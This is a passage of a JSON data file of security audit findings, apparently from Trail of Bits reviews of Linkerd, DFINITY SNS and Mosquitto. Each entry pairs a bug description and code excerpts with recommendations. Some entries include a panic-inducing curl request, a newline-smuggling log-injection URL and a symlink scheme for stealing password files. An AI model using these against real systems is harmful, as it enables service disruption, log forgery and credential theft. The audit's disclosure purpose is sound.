        "body": "When formatting event metadata, the formatMetadata method checks whether a given string in the metadata map contains a given prex. However, rather than using string.HasPrefix to perform this check, it uses string.Contains, which returns true if the given prex string is located anywhere in the target string. for k, v := range meta { if strings.Contains(k, consts.Prefix) || strings.Contains(k, consts.ProxyConfigAnnotationsPrefix) { metadata = append(metadata, fmt.Sprintf(\"%s=%s\", k, v)) } } Figure 3.1: multicluster/service-mirror/events_formatting.go#L23-L27 Recommendations Short term, refactor the prex checks to use string.HasPrefix rather than string.Contains. This will ensure that prexes within strings are properly validated.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "4. Risk of resource exhaustion due to the use of defer inside a loop ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "body": "The runCheck function, responsible for performing health checks for various services, performs its core functions inside of an innite for loop. runCheck is called with a timeout stored in a context object. The cancel() function is deferred at the beginning of the loop. Calling defer inside of a loop could cause resource exhaustion conditions because the deferred function is called when the function exits, not at the end of each loop. As a result, resources from each context object are accumulated until the end of the for statement. While this may not cause noticeable issues in the current state of the application, it is best to call cancel() at the end of each loop to prevent unforeseen issues. func (hc *HealthChecker) runCheck(category *Category, c *Checker, observer CheckObserver) bool { for { ctx, cancel := context.WithTimeout(context.Background(), RequestTimeout) defer cancel() err := c.check(ctx) if se, ok := err.(*SkipError); ok { log.Debugf(\"Skipping check: %s. Reason: %s\", c.description, se.Reason) return true } Figure 4.1: pkg/healthcheck/healthcheck.go#L1619-L1628 Recommendations Short term, rather than deferring the call to cancel(), add a call to cancel() at the end of the loop.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Lack of maximum request and response body constraint ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "body": "The ioutil.ReadAll function reads from source until an error or an end-of-le (EOF) condition occurs, at which point it returns the data that it read. There is no limit on the maximum size of request and response bodies, so using ioutil.ReadAll to parse requests and responses could cause a denial of service (due to insucient memory). A denial of service could also occur if an exhaustive resource is loaded multiple times. This method is used in the following locations of the codebase: File Purpose controller/heartbeat/heartbeat.go:239 Reads responses for heartbeat requests pkg/profiles/openapi.go:32 pkg/version/channels.go:83 controller/webhook/server.go:124 pkg/protohttp/protohttp.go:48 pkg/protohttp/protohttp.go:170 Reads the body of le for the profile command Reads responses from requests for obtaining Linkerd versions Reads requests for the webhook and metrics servers Reads all requests sent to the metrics and TAP APIs Reads error responses from the metrics and TAP APIs In the case of pkg/protohttp/protohttp.go, the readAll function can be called to read POST requests, making it easier for an attacker to exploit the misuse of the ReadAll function. Recommendations Short term, place a limit on the maximum size of request and response bodies. For example, this limitation can be implemented by using the io.LimitReader function. Long term, place limits on request and response bodies globally in other places within the application to prevent denial-of-service attacks.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Potential goroutine leak in Kubernetes port-forwarding initialization logic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "body": "The Init function responsible for initializing port-forwarding connections for Kubernetes causes a goroutine leak when connections succeed. This is because the failure channel in the Init function is set up as an unbuered channel. Consequently, the failure channel blocks the execution of the anonymous goroutine in which it is used unless an error is received from pf.run(). Whenever a message indicating success is received by readChan, the Init function returns without rst releasing the resources allocated by the anonymous goroutine, causing those resources to be leaked. func (pf *PortForward) Init() error { // (...) failure := make(chan error) go func() { if err := pf.run(); err != nil { failure <- err } }() // (...)` select { case <-pf.readyCh: log.Debug(\"Port forward initialised\") case err := <-failure: log.Debugf(\"Port forward failed: %v\", err) return err } Figure 6.1: pkg/k8s/portforward.go#L200-L220 Recommendations Short term, make the failure channel a buered channel of size 1. That way, the goroutine will be cleaned and destroyed when the function returns regardless of which case occurs rst. Long term, run GCatch against goroutine-heavy packages to detect the mishandling of channel bugs. Refer to appendix C for guidance on running GCatch. Basic instances of this issue can also be detected by running this Semgrep rule.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Risk of log injection in TAP service API ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "body": "Requests sent to the TAP service API endpoint, /apis/tap, via the POST method are handled by the handleTap method. This method parses a namespace and a name obtained from the URL of the request. Both the namespace and name variables are then used in a log statement for printing debugging messages to standard output. Because both elds are user controllable, an attacker could perform log injection attacks by calling such API endpoints with a namespace or name with newline indicators, such as \\n. func (h *handler) handleTap(w http.ResponseWriter, req *http.Request, p httprouter.Params) { namespace := p.ByName(\"namespace\") name := p.ByName(\"name\") resource := \"\" // (...) h.log.Debugf(\"SubjectAccessReview: namespace: %s, resource: %s, name: %s, user: <%s>, group: <%s>\", namespace, resource, name, h.usernameHeader, h.groupHeader, ) Figure 7.1: viz/tap/api/handlers.go#L106-L125 Exploit Scenario An attacker submits a POST request to the TAP service API using the URL /apis/tap.linkerd.io/v1alpha1/watch/myns\\nERRO[0000]<attackers log message>/tap, causing invalid logs to be printed and tricking an operator into falsely believing there is a failure. Recommendations Short term, ensure that all user-controlled input is sanitized before it is used in the logging function. Additionally, use the format specier %q instead of %s to prompt Go to perform basic sanitation of strings.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. TLS conguration does not enforce minimum TLS version ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "body": "Transport Layer Security (TLS) is used in multiple locations throughout the codebase. In two cases, TLS congurations do not have a minimum version requirement, allowing connections from TLS 1.0 and later. This may leave the webhook and TAP API servers vulnerable to protocol downgrade and man-in-the-middle attacks. // NewServer returns a new instance of Server func NewServer( ctx context.Context, api *k8s.API, addr, certPath string, handler Handler, component string, ) (*Server, error) { [...] server := &http.Server{ Addr: addr, TLSConfig: &tls.Config{}, } Figure 8.1: controller/webhook/server.go#L43-L64 // NewServer creates a new server that implements the Tap APIService. func NewServer( ctx context.Context, addr string, k8sAPI *k8s.API, grpcTapServer pb.TapServer, disableCommonNames bool, ) (*Server, error) { [...] httpServer := &http.Server{ Addr: addr, TLSConfig: &tls.Config{ ClientAuth: tls.VerifyClientCertIfGiven, ClientCAs: clientCertPool, }, } Figure 8.2: viz/tap/api/sever.go#L34-L76 Exploit Scenario Due to the lack of minimum TLS version enforcement, certain established connections lack sucient authentication and cryptography. These connections do not protect against man-in-the-middle attacks. Recommendations Short term, review all TLS congurations and ensure the MinVersion eld is set to require connections to be TLS 1.2 or newer. Long term, ensure that all TLS congurations across the codebase enforce a minimum version requirement and employ verication where possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Nil dereferences in the webhook server ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf",
        "body": "The webhook servers processReq function, used for handling admission review requests, does not properly validate request objects. As a result, malformed requests result in nil dereferences, which cause panics on the server. If the server receives a request with a body that cannot be decoded by the decode function, shown below, an error is returned, and a panic is triggered when the system attempts to access the Request object in line 154. A panic could also occur if the request is decoded successfully into an AdmissionReview object with a missing Request property. In such a case, the panic would be triggered in line 162. 149 func (s *Server) processReq(ctx context.Context, data []byte) *admissionv1beta1.AdmissionReview { 150 151 152 153 154 155 156 157 158 159 160 161 162 admissionReview, err := decode(data) if err != nil { log.Errorf(\"failed to decode data. Reason: %s\", err) admissionReview.Response = &admissionv1beta1.AdmissionResponse{ admissionReview.Request.UID, UID: Allowed: false, Result: &metav1.Status{ Message: err.Error(), }, } return admissionReview } log.Infof(\"received admission review request %s\", admissionReview.Request.UID) 163 log.Debugf(\"admission request: %+v\", admissionReview.Request) Figure 9.1: controller/webhook/server.go#L149-L163 We tested the panic by getting a shell on a container running in the application namespace and issuing the request in gure 9.2. However, the Go server recovers from the panics without negatively impacting the application. curl -i -s -k -X $'POST' -H $'Host: 10.100.137.130:443' -H $'Accept: */*' -H $'Content-Length: 6' --data-binary $'aaaaaa' $'https://10.100.137.130:443/inject/test Figure 9.2: The curl request that causes a panic Recommendations Short term, add checks to verify that request objects are not nil before and after they are decoded. Long term, run the invalid-usage-of-modified-variable rule from the set of Semgrep rules in the CI/CD pipeline to detect this type of bug. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Use of a custom transfer fee causes the creation of SNS neurons to fail ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf",
        "body": "When a token swap is committed or aborted, the Swap::finalize method is invoked to transfer funds and (if the swap was successful) create new Service Nervous System (SNS) neurons. When a swap is committed, the method calls the Swap::sweep_sns method to transfer the SNS tokens due to each buyer to the buyers SNS neuron subaccount in the SNS governance canister. The sweep_sns method takes a transfer fee that must be equal to the fee dened during the SNS networks conguration. However, Swap::finalize uses the default Internet Computer Protocol (ICP) transfer fee instead. let sweep_sns = self .sweep_sns(now_fn, DEFAULT_TRANSFER_FEE , sns_ledger) . await ; Figure 1.1: The DEFAULT_TRANSFER_FEE passed to Swap::sweep_sns in Swap::finalize is that used in ICP token transfers. The actual token transfer is handled by the ICRC1Client::transfer method, which calls the icrc1_transfer endpoint on the SNS ledger to transfer the funds to the governance canister. As shown in the implementation of icrc1_transfer in gure 1.2, if the SNS transfer fee is dierent from the default ICP transfer fee, this call will fail. async fn icrc1_transfer (arg: TransferArg ) -> Result <Nat, TransferError> { let block_idx = Access::with_ledger_mut(|ledger| { // ... <redacted> let tx = if &arg.to == ledger.minting_account() { // ... <redacted> } else if &from_account == ledger.minting_account() { // ... <redacted> } else { let expected_fee_tokens = ledger.transfer_fee(); let expected_fee = Nat::from(expected_fee_tokens.get_e8s()); if arg.fee.is_some() && arg.fee.as_ref() != Some (&expected_fee) { return Err (TransferError::BadFee { expected_fee }); } Transaction::transfer( from_account, arg.to, amount, expected_fee_tokens, created_at_time, arg.memo, ) }; let (block_idx, _) = apply_transaction(ledger, tx, now)?; Ok (block_idx) })?; } Figure 1.2: SNS token transfers will fail if the transfer fee expected by the SNS ledger (i.e., that dened during conguration) is dierent from the default ICP transfer fee used by the swap canister. In that case, all SNS token transfers will fail, and no new SNS governance neurons will be created. Because subsequent calls to Swap::finalize will fail in the same way, the SNS will become stuck in PreInitializationSwap mode. Moreover, by the time the system is in that state, the swap canister will have already transferred all buyer ICP tokens to the SNS governance canister; that means that buyers will be unable to request a refund by using the error_refund_icp API. Recommendations Short term, pass the SNS token transfer fee as an argument to the swap canister during canister creation, and ensure that the swap canister uses the correct transfer fee in all SNS token transfers. Long term, implement integration tests to check the correctness of token swaps that use SNS token transfer fees dierent from the default ICP transfer fee. Additionally, consider whether the default fee should be removed from the ledger API, since the fee cannot vary.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "2. Failure to ensure that all neurons have been created before the transition to Normal mode ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf",
        "body": "The Swap::set_sns_governance_to_normal_mode_if_all_neurons_claimed method sets the SNS governance mode to Normal , which unlocks functionality like the payout of SNS neuron rewards. The methods name indicates that Normal mode is enabled only if all neurons have been claimed. However, the method checks only whether create_neuron.failure is 0; it fails to check whether create_neuron.skipped is also 0. async fn set_sns_governance_to_normal_mode_if_all_neurons_claimed ( sns_governance_client: & mut impl SnsGovernanceClient, create_neuron: & SweepResult , ) -> Option <SetModeCallResult> { let all_neurons_created = create_neuron.failure == 0 ; if !all_neurons_created { return None ; } Some ( sns_governance_client .set_mode(SetMode { mode: governance ::Mode::Normal as i32 , }) . await .into(), ) } Figure 2.1: The function checks the create_neuron.failure eld when verifying that all new neurons have been successfully created; however, create_neuron.skipped must also be 0. The create_neuron.skipped eld is set to the skipped value returned by Swap::investors_for_create_neuron , which will be greater than 0 if any transfers of SNS tokens to the governance canister have not yet nished. Such transfers could conceivably fail, in which case the mode should not be set to Normal . The Swap::set_sns_governance_to_normal_mode_if_all_neurons_claimed method should account for that possibility. pub fn investors_for_create_neuron (& self ) -> ( u32 , Vec <Investor>) { if self .lifecycle() != Lifecycle::Committed { return ( self .neuron_recipes.len() as u32 , vec! []); } let mut investors = Vec ::new(); let mut skipped = 0 ; for recipe in self .neuron_recipes.iter() { if let Some (sns) = &recipe.sns { if sns.transfer_success_timestamp_seconds > 0 { if let Some (investor) = &recipe.investor { investors.push(investor.clone()); continue ; } else { println! ( \"{}WARNING: missing field 'investor'\" , LOG_PREFIX); } } } else { println! ( \"{}WARNING: missing field 'sns'\" , LOG_PREFIX); } skipped += 1 ; } ( skipped , investors) } Figure 2.2: The skipped value will be greater than 0 if there are transfers of SNS tokens to the governance canister that have not yet nished. We did not nd any ways to exploit this issue. Moreover, because the i nvestors_for_create_neuron method is called after the corresponding token swap has been completed, the transfers should nish successfully, given enough time. Hence, we set the severity of this issue to informational. Recommendations Short term, have the swap canister ensure that create_neuron.skipped is also 0 before updating the SNS governance mode to Normal .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "3. Unnecessary calls to unwrap in get_root_status ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf",
        "body": "The get_root_status function is used to obtain the status of the root canister from the governance canister. The function calls unwrap on the result returned by the governance canister and then calls it again when decoding the returned status. This means that the function will panic if either of the two calls fails. However, the calling method, SnsRootCanister::get_sns_canisters_summary , wraps the result returned by get_root_status in a CanisterSummary . Because CanisterSummary will accept None for the canister status value, the get_root_status function could simply return an object of type Option<CanisterStatusResultV2> instead of CanisterStatusResultV2 . In that case, the function would not need to unwrap the result and would thus avoid a panic. async fn get_root_status ( env: & impl Environment, governance_id: PrincipalId , ) -> CanisterStatusResultV2 { let result = env .call_canister( CanisterId::new(governance_id).unwrap(), \"get_root_canister_status\" , Encode!(&()).unwrap(), ) . await .map_err(|err| { let code = err. 0. unwrap_or_default(); let msg = err. 1 ; format! ( \"Could not get root status from governance: {}: {}\" , code, msg ) }) .unwrap(); Decode!(&result, CanisterStatusResultV2) .unwrap() } Figure 3.1: The get_root_status function will panic if the call to the governance canister fails. Indeed, this type is used by the get_owned_canister_summary function, which returns CanisterSummary::new_with_no_stat(canister_id) if it cannot obtain a canister status. Using this type rather than panicking in get_root_status would improve the error it reports when it fails to obtain the root canister status from the governance canister. Recommendations Short term, avoid panicking in get_root_status , and update the get_root_status function such that it returns None if the inter-canister call fails.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "4. Erroneous controller check in SnsRootCanister::set_dapp_controllers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf",
        "body": "The SnsRootCanister::set_dapp_controllers method is called to update the controller of each decentralized application canister. Before attempting the update, the method checks that the SNS root canister controls the application canister. The method veries only that the call to management_canister_client.canister_status returned Ok(_) ; it fails to check that the root canister ID is in the set of controller IDs. let is_controllee = management_canister_client .canister_status(&dapp_canister_id.into()) . await .is_ok() ; assert! ( is_controllee, \"Operation aborted due to an error; no changes have been made: \\ Unable to determine whether this canister (SNS root) is the controller \\ of a registered dapp canister ({dapp_canister_id}). This may be due to \\ the canister having been deleted, which may be due to it running out \\ of cycles.\" ); Figure 4.1: The management canister returns a Result that wraps a CanisterStatusResultV2 containing the list of controllers for the given canister. However, the error management that the method performs when making the update renders the check unnecessary; thus, the check can be removed. If a token swap is aborted, the swap canister calls the set_dapp_controllers API on the root canister to return control of the application canisters to a set of fallback controllers. If the check in SnsRootCanister::set_dapp_controllers were xed rather than removed, the inter-canister call would cause the swap canister to panic if one of the application canisters had been deleted; in that case, control of the canisters would not be transferred from the SNS canister to the fallback controllers. Recommendations Short term, remove the check highlighted in gure 4.1 from the SnsRootCanister::set_dapp_controllers method.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Accounts with low balances are trimmed from the ICRC-1 ledger ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf",
        "body": "If the number of ledger accounts with a non-zero balance reaches 28.1 million (the sum of the xed values in gure 5.1), the ICRC-1 ledger will immediately burn the assets of the accounts with the lowest balances: Ledger::max_number_of_accounts() + Ledger::accounts_overflow_trim_quantity() Figure 5.1: The MAX_ACCOUNTS value (28 million) is added to the ACCOUNTS_OVERFLOW_TRIM_QUANTITY value (100,000). The number of accounts trimmed by the ICRC-1 ledger in this way is indicated by the ACCOUNTS_OVERFLOW_TRIM_QUANTITY value (which is set to 100,000). let to_trim = if ledger.balances().store.len() >= ledger.max_number_of_accounts() + ledger.accounts_overflow_trim_quantity() { select_accounts_to_trim(ledger) } else { vec! [] }; for (balance, account) in to_trim { let burn_tx = L::Transaction::burn(account, balance, Some (now), None ); burn_tx .apply(ledger.balances_mut()) .expect( \"failed to burn funds that must have existed\" ); let parent_hash = ledger.blockchain().last_hash; ledger .blockchain_mut() .add_block(L::Block::from_transaction(parent_hash, burn_tx, now)) .unwrap(); } Figure 5.2: If the number of accounts with a non-zero balance grows too large, accounts will be trimmed from the ledger. This behavior could be very surprising to users and, to our knowledge, is not documented. (For reference, according to Glassnode , there are currently around 85 million Ethereum addresses with a non-zero balance.) If accounts with non-negligible balances are trimmed from the ledger, the practice could cause reputational issues for DFINITY. Moreover, the highlighted if statement condition is most likely wrong. If the total number of accounts tracked by the ledger reaches 28.1 million, the removal of 100,000 accounts will not decrease the number of accounts to less than Ledger::max_number_of_accounts() (which is set to 28 million). Recommendations Short term, update the if statement condition so that it compares the number of accounts to the Ledger::max_number_of_accounts() value. Long term, ensure that the account-trimming behavior is described in both internal and external documentation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "6. Potentially harmful remove_self_as_controller pattern ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf",
        "body": "During the setup of the governance canister, it is controlled by the SNS-WASM and root canisters. Then, when the SNS-WASM canister no longer needs to perform any privileged operations, its remove_self_as_controller function changes the governance canisters controllers to a predetermined set (via calls to the CanisterApi::set_controllers function). This set consists of only the root canister, so the function removes the SNS-WASM canister as a controller when making that change. This implementation works for the SNS-WASM canister because these controller sets are static and predetermined; however, the function implementation might not be suitable for reuse in a dynamic context. async fn add_controllers ( canister_api: & impl CanisterApi, canisters: & SnsCanisterIds , ) -> Result <(), String > { let this_canister_id = canister_api.local_canister_id().get(); let set_controllers_results = vec! [ // Set Root as controller of Governance. canister_api .set_controllers( CanisterId::new(canisters.governance.unwrap()).unwrap(), vec! [this_canister_id, canisters.root.unwrap()], ) . await .map_err(|e| { format! ( \"Unable to set Root as Governance canister controller: {}\" , e ) }), // ... ]; join_errors_or_ok(set_controllers_results) } Figure 6.1: The initial setting of the controller set async fn remove_self_as_controller ( canister_api: & impl CanisterApi, canisters: & SnsCanisterIds , ) -> Result <(), String > { let set_controllers_results = vec! [ // Removing self, leaving root. canister_api .set_controllers( CanisterId::new(canisters.governance.unwrap()).unwrap(), vec! [canisters.root.unwrap()], ) . await .map_err(|e| { format! ( \"Unable to remove SNS-WASM as Governance's controller: {}\" , e ) }), // ... ]; join_errors_or_ok(set_controllers_results) } Figure 6.2: The use of a manual rather than dynamic controller-removal process Recommendations Short term, consider adding a remove_controller function to the CanisterApi and having that function call remove_self_as_controller .",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "7. Use of panicking functions poses a risk to the ledgers archiving mechanism ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-dfinity-sns-securityreview.pdf",
        "body": "The ICRC-1 ledger calls the archive_blocks function to archive a prex of the local blockchain. That function creates an ArchiveGuard that contains a write lock on the global Archive instance of the ledger state. let archive_arc = LA::with_ledger(|ledger| ledger.blockchain().archive.clone()); // NOTE: this guard will prevent another logical thread to start the archiving // process. let _archiving_guard = match ArchivingGuard::new(Arc::clone(&archive_arc)) { Ok (guard) => guard, Err (ArchivingGuardError::NoArchive) => { return ; // Archiving not enabled } Err (ArchivingGuardError::AlreadyArchiving) => { print::<LA>( \"[ledger] ledger is currently archiving, skipping archive_blocks()\" ); return ; } }; Figure 7.1: The archive_blocks function takes a write lock on the ledger archive. If a new archive node must be created, the ledger invokes the asynchronous create_and_initialize_node_canister function, which creates a new canister and installs the correct Wasm binary. When the function installs the archive nodes Wasm code, it calls unwrap on the encoded arguments passed to it. Because this call is sandwiched between other asynchronous inter-canister calls, the ledger state will have been persisted to disk between the placement of the lock on the archive and the call to unwrap . This means that if the unwrapping operation fails, the archive will remain locked indenitely. let () = spawn::install_code::<Rt>( node_canister_id, Wasm::archive_wasm().into_owned(), Encode!( &Rt::id(), &node_block_height_offset, & Some (node_max_memory_size_bytes) ) .unwrap() , ) . await .map_err(|(reject_code, message)| { FailedToArchiveBlocks( format! ( \"install_code failed; reject_code={}, message={}\" , reject_code, message )) })?; Figure 7.2: When a canisters state is locked, the canister should avoid calling panicking functions after making asynchronous inter-canister calls. Normally, this issue would constitute a severe risk to the availability of the ledger canisters archiving functionality. However, because the call to Encode is very unlikely to fail, we set the severity of this issue to low. Calls to panicking functions in situations like this one, in which a canisters state is persisted when part of it is locked, make the implementation more dicult to understand. To determine whether such a call is safe, the reader (whether a developer or external reviewer) must identify the exact conditions under which the function will panic, which is typically nontrivial. Exploit Scenario A DFINITY developer refactors the implementation of Encode and inadvertently introduces an error into it. Later, when the ledger calls create_and_initialize_node_canister , the error causes the call to Encode to fail. As a result, the ledger archive remains in a locked state indenitely. Recommendations Short term, remove the call to unwrap from the create_and_initialize_node_canister function, and have the function return an error if the call to the Encode macro fails. Long term, review the system canisters to ensure that they do not call panicking functions after making asynchronous inter-canister calls. Alternatively, ensure that the documentation covers the calls to panicking functions and explains why they are safe.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "2. Improper implementation of constant-time comparison ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "Constant-time comparison is used in cryptographic code to avoid disclosing information about sensitive data through timing attacks. Mosquitto implements two functions with the same body, memcmp_const and pw__memcmp_const , that are meant to compare two arrays (e.g., password hashes) in constant time but whose runtimes actually vary with the input data. The memcmp_const function is shown in gure 2.1. static int memcmp_const ( const void *a, const void *b, size_t len) 37 38 { 39 40 41 42 43 44 45 46 47 48 49 50 } size_t i; int rc = 0 ; if (!a || !b) return 1 ; for (i= 0 ; i<len; i++){ if ( (( char *)a)[i] != (( char *)b)[i] ){ rc = 1 ; } } return rc; Figure 2.1: plugins/dynamic-security/auth.c#L37-L50 The problem occurs on lines 45-47. If a[i] diers from b[i] , a branch is taken that assigns 1 to the rc variable. If a[i] and b[i] are the same value, the branch is not taken. This behavior results in a longer execution time for the function when a and b dier. As a result, memcmp_const and pw__memcmp_const do not run in constant time and may disclose information about either a or b . An example of a secure function for constant-time comparison is OpenSSLs CRYPTO_memcmp , which uses bitwise operations to ensure that a constant number of instructions is executed, regardless of a s or b s contents: 443 444 { int CRYPTO_memcmp ( const void * in_a, const void * in_b, size_t len) 445 446 447 448 449 450 451 452 453 454 } size_t i; const volatile unsigned char *a = in_a; const volatile unsigned char *b = in_b; unsigned char x = 0 ; for (i = 0 ; i < len; i++) x |= a[i] ^ b[i]; return x; Figure 2.2: OpenSSLs historical implementation of CRYPTO_memcmp CRYPTO_memcmp is now written in assembly to prevent the compiler from optimizing it into a version that does not run in constant time. Currently, Mosquittos constant-time comparison functions are used only to compare password hashes. Constant-time comparison is not strictly required for secure password hash comparison. Therefore, this issue may not be directly exploitable unless the functions are reused for a dierent feature that is susceptible to timing attacks. Exploit Scenario Mosquitto developers add a feature whose security depends on the ability to compare bytes in constant time in order to prevent timing attacks (e.g., comparison of cryptographic private keys). They reuse memcmp_const for this purpose, expecting it to operate in constant time; however, the functions dierent execution times for dierent inputs result in the disclosure of secret information, compromising the security of the feature. Recommendations Short term, remove memcmp_const and pw__memcmp_const . Instead, use CRYPTO_memcmp from OpenSSL for constant-time comparison.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. mosquitto_passwd creates world-readable password les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "The mosquitto_passwd utility allows the user to create new password les and update entries in existing ones. Before updating an existing password le, mosquitto_passwd also creates a temporary backup of its original contents in the same directory. When creating a new password le or a backup of an existing one, mosquitto_passwd does not set a le mode creation mask (via the umask(2) system call ) to set secure le permissions (e.g., only readable and writable by the current user). As a result, password les created using mosquitto_passwd on default congurations of most Linux distributions, which use a mask value of 022 , are readable by all users on the system and writable by all members of the users group (gure 3.1). $ ./mosquitto_passwd -b -c mypasswords admin password Adding password for user admin $ ls -la mypasswords -rw-rw-r-- 1 ubuntu ubuntu 191 Feb 23 15:04 mypasswords Figure 3.1: The mosquitto_passwd utility creates a world-readable password le on Ubuntu 22.04. In update mode, mosquitto_passwd includes a call to umask with a secure mask value of 077 (clearing all permission bits except those for the user) before creating a temporary le that the contents of the new password le are written to. However, this call occurs after the backup of the existing password le is created and therefore does not aect the backup les permissions. Exploit Scenario A Mosquitto broker administrator uses the mosquitto_passwd utility to generate a password le and add entries to it. An attacker on the system, under another user account, does not have authorized access to the broker but can read the directory in which the password le was created. The attacker exploits the default world-readable permissions of the password le to access its contents, brute-force the password hashes (see TOB-MOSQ-CR-1 ), and gain access to the broker. Recommendations Short term, have the mosquitto_passwd utility call umask with a mask of 077 before calling fopen to create a new password le or a backup of an existing one. This will ensure that only the user running mosquitto_passwd can read or write to the le. Long term, use the File created without restricting permissions CodeQL query to identify additional instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. mosquitto_passwd trusts existing backup les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
        "body": "The mosquitto_passwd utility allows the user to update entries in an existing password le. Before updating a password le, mosquitto_passwd uses the create_backup function to make a temporary backup le containing the contents of the original password le. Upon successfully updating the original password le, mosquitto_passwd removes the backup le. The path of the backup le is the same as that of the original password le, with the added extension .tmp, but mosquitto_passwd does not ensure that this le does not already exist before opening it in create_backup (gure 4.1). snprintf(backup_file, strlen(password_file)+ 5 , \"%s.tmp\" , password_file); if (!backup_file){ fprintf(stderr, \"Error: Out of memory.\\n\" ); free(password_file); return 1 ; 615 backup_file = malloc(( size_t )strlen(password_file)+ 5 ); 616 617 618 619 620 } 621 622 free(password_file); 623 password_file = NULL ; 624 625 626 627 628 629 } fclose(fptr); free(backup_file); return 1 ; if ( create_backup(backup_file, fptr) ){ Figure 4.1: apps/mosquitto_passwd/mosquitto_passwd.c#L615-L629 Because the backup lename is predictable and mosquitto_passwd trusts existing backup les, an attacker could create a le with the expected name of a backup le to exltrate password le contents that they should not have access to. The default use of the fs.protected_symlinks=1 and fs.protected_regular=1 kernel parameters on some Linux distributions mitigates exploitation of this issue, but Mosquitto developers should not assume these are set on all systems where mosquitto_passwd might be used. Exploit Scenario A Mosquitto broker administrator uses the mosquitto_passwd utility to update an entry in a password le named passwords . An attacker on the system, under another user account, does not have authorized access to the broker but can write to the directory in which the password le is stored. Before the administrator runs mosquitto_passwd , the attacker creates a symlink called passwords.tmp in the same directory as passwords that points to a le that the administrator can write to and the attacker can read from (e.g., /tmp/copied_passwords ). When the administrator runs mosquitto_passwd , the tool opens the attacker-controlled passwords.tmp , trusting it as the backup le, then follows the symlink and writes the original contents of passwords to /tmp/copied_passwords . After successfully updating passwords , mosquitto_passwd removes passwords.tmp , but the destination le at /tmp/copied_paswords remains. The attacker reads the original passwords contents from this le and brute-forces the hashes it contains (see TOB-MOSQ-CR-1 ) to gain access to the broker. Alternatively, instead of using a symlink, the attacker creates a regular le called passwords.tmp and grants the administrator permission to write to it. In this situation, mosquitto_passwd still writes the backup contents to passwords.tmp but deletes it immediately after updating passwords . However, the attacker can still race mosquitto_passwd to access passwords.tmp before it is removed. Recommendations Short term, instead of appending .tmp to the original password le name, use mkstemp(3) to create a temporary backup le with a unique name, similar to how mosquitto_passwd generates another temporary le . The use of mkstemp would resolve this issue due to this assurance: The le is opened with the open(2) O_EXCL ag, guaranteeing that the caller is the process that creates the le. Ensure that read and write access for the temporary le is restricted to the legitimate user (see TOB-MOSQ-CR-3 ). 5. Heap bu\u0000er overread issue in persist__chunk_client_write_v6 Severity: High Diculty: Undetermined Type: Data Validation Finding ID: TOB-MOSQ-CR-5 Target: src/persist_write_v5.c",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. mosquitto_ctrl dynsec init creates world-readable cong ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-eclipse-mosquitto-securityreview.pdf",
